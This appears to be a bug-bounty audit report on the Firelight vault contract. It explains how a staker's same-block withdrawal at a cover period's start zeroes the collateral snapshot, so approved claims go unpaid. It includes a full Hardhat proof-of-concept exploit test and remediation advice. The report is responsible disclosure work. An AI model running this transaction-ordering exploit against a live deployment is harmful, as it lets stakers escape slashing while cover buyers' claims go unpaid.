# 88585 sc high same block period start withdrawal retroactively changes committed collateral and causes protocol insolvency

**Submitted on Aug 13th 2026 at 23:30:42 UTC by @Porcupine17126 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88585
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Summary

`FirelightVault` uses a timestamp-keyed checkpoint both as mutable ERC-4626 history and as the immutable collateral snapshot for a cover period. A lookup at the period-start timestamp can therefore change later in the same block after the allocator has already relied on it.

If an allocation is committed in the first block of a period, an unprivileged staker can place a withdrawal after that commitment in the same block. Every transaction in the block has the exact period-start timestamp. The commitment first reads the last checkpoint at or before the boundary and receives the pre-withdrawal 10,000-unit value. It does not itself write a vault checkpoint. The later withdrawal calls `_logTrace()` with zero active assets at the boundary key, so every subsequent lookup at that same period start returns zero. If a checkpoint already exists at that key, `Trace256.push()` replaces it; in the demonstrated sequence, the withdrawal inserts the first exact-boundary checkpoint after the commitment's read. In either case, a later same-timestamp state change retroactively changes the historical lookup result on which the existing commitment relied.

The commitment remains valid and its orders can still settle, charge premium, and mint cover NFTs. A later claim, however, reads the changed period-start value as its vault exposure cap. Its vault-funded leg can pay zero even though all of that collateral is still physically held in the vault's explicitly exposed withdrawal pool.

The PoC demonstrates the complete production payout path with a funded and approved first-loss buffer: 1,000 USDC FLB + 10,000 vault assets back 11,000 units of cover.

1. A staker deposits 10,000 vault assets.
2. The external FLB is funded with 1,000 USDC and approves the real `IncidentManager`.
3. A cover buyer creates an 11,000-unit order for the next period.
4. In the first block of that period, the trusted allocator commits 11,000 of capacity.
5. In the same block, after the commitment, the unprivileged staker redeems all shares.
6. The order settles, premium is charged, and its CoverNFT is minted.
7. The vault still holds all 10,000 assets in `pendingWithdrawAssets`, but `totalAssetsAt(periodStart)` is now zero.
8. The real incident flow creates and confirms the incident, assesses the 11,000 loss, submits it, and approves it.
9. The FLB leg legitimately pays its full 1,000 USDC, but the remaining 10,000-unit vault leg pays zero.
10. The incident is permanently closed with only 1,000 of 11,000 paid and `vaultPaidAmount == 0`.
11. After the withdrawal delay, the staker claims all 10,000 vault assets.

No privileged key is compromised. The allocator performs its intended action first; the attacker only uses the public `redeem()` function and transaction ordering in an exact-boundary block. The opportunity is conditional rather than deterministic: it exists whenever the trusted commitment lands in a block whose timestamp equals the exact period start.

## Root cause

`redeem()` records post-withdrawal assets at the current block timestamp:

```solidity
uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);
_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

`_logTrace()` pushes that value using `Time.timestamp()`:

```solidity
uint48 ts = Time.timestamp();
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

The custom `Trace256.push()` implementation appends an exact-boundary checkpoint when none exists and replaces the last checkpoint when `key == lastKey`. The demonstrated commitment is a read, not a checkpoint write: it receives 10,000 from the last checkpoint at or before the new boundary. The later withdrawal inserts zero at that exact boundary, making all future lookups for the value already consumed by the commitment return zero. If another state change had already written the boundary key, `push()` would replace that value instead. The security failure is the retroactive mutation of the lookup result, not a requirement that the PoC literally replace an existing array entry.

Both underwriting and payouts depend on that mutable key. `CoverOrderAllocator._computeAvailableCapacity()` reads:

```solidity
$.vault.totalAssetsAt($.vault.currentPeriodStart())
```

and `FirelightVault.payout()` later caps the claim with:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

After the boundary withdrawal, `activePayableAmount` correctly includes the 10,000-unit withdrawal pool, but the retroactively changed `assetsAtCapturePeriod == 0` forces `paidAmount == 0`.

## Impact

The system sells and charges for cover backed by a capacity commitment whose vault leg becomes unpayable after a public vault action. The correctly funded and approved FLB does not prevent the issue: it is consumed first, then the attacker retains the entire vault withdrawal while the approved claim is permanently closed with the vault remainder unpaid. The attack can affect up to the vault backing committed in that period, producing liabilities without payable collateral and therefore protocol insolvency.

The attack is opportunistically repeatable at period boundaries whenever the allocator commitment lands in a block whose timestamp equals the exact period start. The attacker does not control the timestamp or the allocator, but can monitor the pending commitment and order a public `redeem()` after it. The PoC uses ordinary same-block transaction ordering; it does not alter the timestamp between transactions.

## Recommended remediation

Do not use a mutable timestamp checkpoint as an immutable underwriting-period snapshot. Pin the period-start backing in dedicated per-period storage before the first state change of the period, and use that same immutable value for both capacity commitment and claims. In particular, a deposit, withdrawal, reward checkpoint, or payout mined at the period-start timestamp must not be able to alter the already-observed start-of-period value.

A regression test should commit capacity first and then execute `redeem()` in the same period-start block. The period-start backing used by `payout()` must remain 10,000 and the exposed withdrawal pool must remain slashable.

## Novelty / duplicate distinction

This is distinct from the previously reported stale-capacity-after-payout issue. That report concerns a prior-period incident spending collateral while the following period reuses an older snapshot. This finding requires no earlier incident or payout. Its root cause is a same-timestamp state change retroactively altering the exact period-start lookup after a valid current-period commitment.

The fixes and regression tests are different. The earlier report requires remaining period backing to be reduced after a cross-period payout. This finding requires a period-start value already consumed by a commitment to become immutable against later writes with the same timestamp.

## Proof of Concept

## Proof of Concept

Create `test/research/periodBoundaryEndToEnd.test.js` with the complete source below, then run:

```bash
npx hardhat test test/research/periodBoundaryEndToEnd.test.js
```

The first test demonstrates the exploit through the real allocator, funded/approved FLB, CoverNFT settlement, and IncidentManager payout. The second test is the boundary + 1 second control and proves the failure is specific to an exact period-start write.

```javascript
const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')
const { expect } = require('chai')
const { ethers, network, upgrades } = require('hardhat')

const { deployVault, computeMarketId } = require('../setup/fixtures.js')

describe('Research PoC: committed cover becomes unpayable after same-block boundary withdrawal', function () {
  const DECIMALS = 6
  const PERIOD = 24 * 60 * 60
  const DEPOSIT = ethers.parseUnits('10000', DECIMALS)
  const FLB = ethers.parseUnits('1000', DECIMALS)
  const COVER = ethers.parseUnits('11000', 18)
  const MARKET = ethers.encodeBytes32String('market-A')
  const MARKET_ID = computeMarketId(1, 'Aave', MARKET)

  async function fullProtocolFixture() {
    const ctx = await deployVault({
      decimals: DECIMALS,
      initial_deposit_limit: ethers.parseUnits('50000', DECIMALS),
      period_configuration_duration: PERIOD
    })
    const staker = ctx.users[0]
    const buyer = ctx.users[1]
    const firstLossBuffer = ctx.users[2]
    const curator = ctx.limit_updater
    const allocatorRole = ctx.blocklister
    const configAdmin = ctx.pauser
    const adminRole = ctx.period_configuration_updater

    await ctx.utils.mintAndApprove(DEPOSIT, staker)
    await ctx.firelight_vault.connect(staker).deposit(DEPOSIT, staker.address)

    const MockERC20 = await ethers.getContractFactory('MockERC20')
    const usdc = await MockERC20.deploy('MockUSDC', 'mUSDC', DECIMALS)
    const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
    const priceFeed = await MockAggregator.deploy(18, 10n ** 18n)

    const CoverNFT = await ethers.getContractFactory('CoverNFT')
    const coverNFT = await upgrades.deployProxy(
      CoverNFT,
      ['Firelight Cover', 'FLCOVER', '', ctx.deployer.address, ctx.deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
      { kind: 'transparent' }
    )

    const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
    const allocator = await upgrades.deployProxy(
      Allocator,
      [{
        vault: await ctx.firelight_vault.getAddress(),
        premiumCollector: ctx.rescuer.address,
        coverNFT: await coverNFT.getAddress(),
        priceFeedAdapter: await priceFeed.getAddress(),
        maxPriceAge: 7 * PERIOD,
        premiumTokens: [await usdc.getAddress()],
        admin: ctx.deployer.address,
        adminRole: adminRole.address,
        curatorRole: curator.address,
        allocatorRole: allocatorRole.address,
        configAdminRole: configAdmin.address,
        initialProtocolConcentrations: [{
          protocol: 'Aave',
          chainId: 1,
          maxProtocolConcentrationBps: 10_000
        }],
        newMarkets: [{ chainId: 1, protocol: 'Aave', market: MARKET }],
        capacityConfig: {
          minCAR: 12_000,
          firstLossBufferToken: await usdc.getAddress(),
          firstLossBuffer: firstLossBuffer.address,
          effectiveLeverage: 12_000,
          minOrderMarketCoverAmount: 1,
          divergenceToleranceBps: 0
        }
      }],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
    )

    await coverNFT.connect(ctx.deployer).grantRole(await coverNFT.MINTER_ROLE(), await allocator.getAddress())

    const IncidentManager = await ethers.getContractFactory('IncidentManager')
    const assessmentApprover = ctx.period_configuration_updater
    const incidentManager = await upgrades.deployProxy(
      IncidentManager,
      [
        ctx.deployer.address,
        curator.address,
        assessmentApprover.address,
        ctx.blocklister.address,
        ctx.rescuer.address,
        ctx.pauser.address,
        ctx.deployer.address,
        ctx.deployer.address,
        ctx.payout_receiver.address,
        await allocator.getAddress(),
        await priceFeed.getAddress(),
        7 * PERIOD
      ],
      { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
    )

    await ctx.firelight_vault
      .connect(ctx.deployer)
      .grantRole(await ctx.firelight_vault.PAYOUT_ROLE(), await incidentManager.getAddress())
    await ctx.firelight_vault
      .connect(ctx.deployer)
      .grantRole(await ctx.firelight_vault.INCIDENT_ROLE(), await incidentManager.getAddress())

    // Respect the program's operational assumption: the external first-loss
    // buffer is funded and has approved IncidentManager. The approved claim
    // legitimately consumes this buffer before reaching the broken vault leg.
    await usdc.mint(firstLossBuffer.address, FLB)
    await usdc.connect(firstLossBuffer).approve(await incidentManager.getAddress(), FLB)

    await usdc.mint(buyer.address, ethers.parseUnits('1000', DECIMALS))
    await usdc.connect(buyer).approve(await allocator.getAddress(), ethers.MaxUint256)
    await allocator.connect(curator).createCoverOrder(
      buyer.address,
      ctx.payout_receiver.address,
      'covered-beneficiary',
      await usdc.getAddress(),
      [{ marketId: MARKET_ID, coverRateAnnual: 500, coverAmount: COVER }],
      0
    )

    const tree = StandardMerkleTree.of(
      [[0n, [[MARKET_ID, COVER]]]],
      ['uint256', '(bytes32,uint256)[]']
    )

    return {
      ...ctx,
      staker,
      buyer,
      curator,
      allocatorRole,
      assessmentApprover,
      firstLossBuffer,
      usdc,
      coverNFT,
      allocator,
      incidentManager,
      tree
    }
  }

  it('charges premium and mints cover, yet the approved claim pays only FLB and zero from the vault', async function () {
    const ctx = await loadFixture(fullProtocolFixture)
    const boundary = await ctx.firelight_vault.currentPeriodEnd()

    // Put the trusted allocator commitment first and the unprivileged staker's
    // withdrawal second in the same first block of the new period.
    await network.provider.send('evm_setAutomine', [false])
    try {
      await network.provider.send('evm_setNextBlockTimestamp', [Number(boundary)])
      const commitTx = await ctx.allocator.connect(ctx.allocatorRole).commitAllocation(
        1,
        ctx.tree.root,
        COVER,
        COVER,
        { gasLimit: 2_000_000, gasPrice: 2_000_000_000 }
      )
      const withdrawTx = await ctx.firelight_vault.connect(ctx.staker).redeem(
        DEPOSIT,
        ctx.staker.address,
        ctx.staker.address,
        { gasLimit: 2_000_000, gasPrice: 1_000_000_000 }
      )
      await network.provider.send('evm_mine')
      await commitTx.wait()
      await withdrawTx.wait()
    } finally {
      await network.provider.send('evm_setAutomine', [true])
    }

    const commitment = await ctx.allocator.getAllocationCommitment(1)
    expect(commitment.totalAvailableCapacity).to.equal(COVER)
    expect(await ctx.firelight_vault.totalAssetsAt(boundary)).to.equal(0n)
    expect(await ctx.firelight_vault.pendingWithdrawAssets()).to.equal(DEPOSIT)

    const premiumBefore = await ctx.usdc.balanceOf(ctx.rescuer.address)
    await ctx.allocator.connect(ctx.allocatorRole).settleCoverOrder(
      0,
      [{ marketId: MARKET_ID, allocatedCover: COVER }],
      ctx.tree.getProof(0)
    )
    expect(await ctx.coverNFT.ownerOf(0)).to.equal(ctx.buyer.address)
    expect(await ctx.usdc.balanceOf(ctx.rescuer.address)).to.be.greaterThan(premiumBefore)

    // The cover is MATCHED and paid for, and the vault still physically holds
    // all 10,000 FXRP in an exposed withdrawal pool. Process the claim through
    // the real IncidentManager, with the funded/approved 1,000-USDC FLB leg
    // consumed first and the remaining 10,000 requested from the vault.
    expect((await ctx.allocator.getCoverOrder(0)).status).to.equal(1n)
    expect(await ctx.token_contract.balanceOf(ctx.firelight_vault.target)).to.equal(DEPOSIT)

    await ctx.incidentManager.connect(ctx.curator).createIncident(
      boundary,
      'Boundary checkpoint claim',
      ethers.id('boundary-checkpoint-claim')
    )
    await ctx.incidentManager.connect(ctx.curator).confirmIncident(1, 'ipfs://boundary-checkpoint-claim')
    await ctx.incidentManager.connect(ctx.curator).addAssessmentLosses(1, [{
      coverTokenId: 0,
      marketId: MARKET_ID,
      amount: COVER
    }])
    await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1)
    await ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1)

    // The FLB operated correctly, but the retroactively changed period-start
    // lookup makes the 10,000-FXRP vault remainder pay zero.
    expect(await ctx.usdc.balanceOf(ctx.firstLossBuffer.address)).to.equal(0n)
    expect(await ctx.usdc.balanceOf(ctx.payout_receiver.address)).to.equal(FLB)
    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(0n)
    const [incident] = await ctx.incidentManager.getIncident(1)
    expect(incident.status).to.equal(4n)
    expect(incident.vaultPaidAmount).to.equal(0n)

    const withdrawPeriod = 2n
    await time.increase(PERIOD * 2)
    await ctx.firelight_vault.connect(ctx.staker).claimWithdraw(withdrawPeriod)
    expect(await ctx.token_contract.balanceOf(ctx.staker.address)).to.equal(DEPOSIT)
  })

  it('pays the full vault leg when the same withdrawal is one second after the boundary', async function () {
    const ctx = await loadFixture(fullProtocolFixture)
    const boundary = await ctx.firelight_vault.currentPeriodEnd()

    // Commit against the 10,000-unit period-start value, then execute the same
    // public withdrawal just one second later rather than at the boundary key.
    await time.setNextBlockTimestamp(boundary)
    await ctx.allocator.connect(ctx.allocatorRole).commitAllocation(
      1,
      ctx.tree.root,
      COVER,
      COVER
    )
    await time.setNextBlockTimestamp(boundary + 1n)
    await ctx.firelight_vault.connect(ctx.staker).redeem(
      DEPOSIT,
      ctx.staker.address,
      ctx.staker.address
    )

    const commitment = await ctx.allocator.getAllocationCommitment(1)
    expect(commitment.totalAvailableCapacity).to.equal(COVER)
    expect(await ctx.firelight_vault.totalAssetsAt(boundary)).to.equal(DEPOSIT)
    expect(await ctx.firelight_vault.pendingWithdrawAssets()).to.equal(DEPOSIT)

    await ctx.allocator.connect(ctx.allocatorRole).settleCoverOrder(
      0,
      [{ marketId: MARKET_ID, allocatedCover: COVER }],
      ctx.tree.getProof(0)
    )

    await ctx.incidentManager.connect(ctx.curator).createIncident(
      boundary,
      'Boundary plus one control claim',
      ethers.id('boundary-plus-one-control-claim')
    )
    await ctx.incidentManager.connect(ctx.curator).confirmIncident(1, 'ipfs://boundary-plus-one-control-claim')
    await ctx.incidentManager.connect(ctx.curator).addAssessmentLosses(1, [{
      coverTokenId: 0,
      marketId: MARKET_ID,
      amount: COVER
    }])
    await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1)
    await ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1)

    // The FLB pays 1,000 and the unchanged period-start cap lets the vault pay
    // the entire remaining 10,000 from the exposed withdrawal pool.
    expect(await ctx.usdc.balanceOf(ctx.firstLossBuffer.address)).to.equal(0n)
    expect(await ctx.usdc.balanceOf(ctx.payout_receiver.address)).to.equal(FLB)
    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(DEPOSIT)
    const [incident] = await ctx.incidentManager.getIncident(1)
    expect(incident.status).to.equal(4n)
    expect(incident.vaultPaidAmount).to.equal(DEPOSIT)
  })
})

```

Observed focused result:

```
Research PoC: committed cover becomes unpayable after same-block boundary withdrawal
  ✔ charges premium and mints cover, yet the approved claim pays only FLB and zero from the vault
  ✔ pays the full vault leg when the same withdrawal is one second after the boundary

2 passing (1s)
```

Control assertions:

* withdrawal timestamp = boundary + 1
* totalAssetsAt(boundary) = 10,000
* pendingWithdrawAssets = 10,000
* vaultPaidAmount = 10,000

Full repository regression:

```
npx hardhat test
456 passing (12s)
```
